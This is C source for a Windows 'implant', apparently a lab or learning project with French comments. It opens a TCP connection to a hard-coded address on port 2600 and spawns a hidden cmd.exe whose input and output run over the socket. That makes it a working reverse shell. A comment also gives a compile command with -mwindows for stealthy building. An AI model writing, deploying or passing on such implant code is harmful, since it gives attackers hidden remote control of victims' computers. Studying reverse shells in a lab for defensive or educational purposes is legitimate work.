#include "implant.h"
// Compilation command: x86_64-w64-mingw32-gcc Implant.c -o implant.exe -lws2_32
// futiv command : x86_64-w64-mingw32-gcc implant.c -o implant.exe -lws2_32 -mwindows
int main(){
// Set variables
    char rcvbuffer[DEFAULT_BUFLEN];
    char sndbuffer[DEFAULT_BUFLEN];
    char command[] = "cmd.exe";
    WSADATA wsa;
    WSAStartup(MAKEWORD(2,2), &wsa);
    SOCKET soc = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    SOCKADDR_IN server;
    STARTUPINFO sinfo;
    PROCESS_INFORMATION pinfo;

    //clean the struct sinfo & pinfo
    memset(&sinfo, 0, sizeof(sinfo));
    memset(&pinfo, 0, sizeof(pinfo));

    // Assign the count of binary of the struct size
    sinfo.cb = sizeof(sinfo);



    sinfo.dwFlags = STARTF_USESTDHANDLES|STARTF_USESHOWWINDOW;
    sinfo.wShowWindow = SW_HIDE;
    sinfo.hStdInput = (HANDLE)soc;
    sinfo.hStdOutput = (HANDLE)soc;
    sinfo.hStdError = (HANDLE)soc;

    // set server's variables
    server.sin_family = AF_INET;
    server.sin_port = htons(2600);
    server.sin_addr.s_addr = inet_addr("192.168.1.146");

    // 1. On vérifie si la connexion marche vraiment
    if (connect(soc, (struct sockaddr *)&server, sizeof(server)) == SOCKET_ERROR) {
        printf("[!] Erreur de connexion.\n");
        return 1;
    }
    printf("[+] Connecte au serveur !\n");

    // 2. On lance cmd.exe et on VÉRIFIE s'il a réussi
    if (!CreateProcessA(
        NULL, command, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo
    )) {
        // S'il échoue, GetLastError() nous donnera le code d'erreur précis de Windows
        printf("[!] Erreur CreateProcess: %lu\n", GetLastError());
        return 1;
    }
    printf("[+] CMD.exe lance avec succes. En attente...\n");


    WaitForSingleObject(pinfo.hProcess, INFINITE);
    // cleanup
    closesocket(soc);
    WSACleanup();
    














    
// cleanup
    closesocket(soc);
    WSACleanup();

    return 0;
}
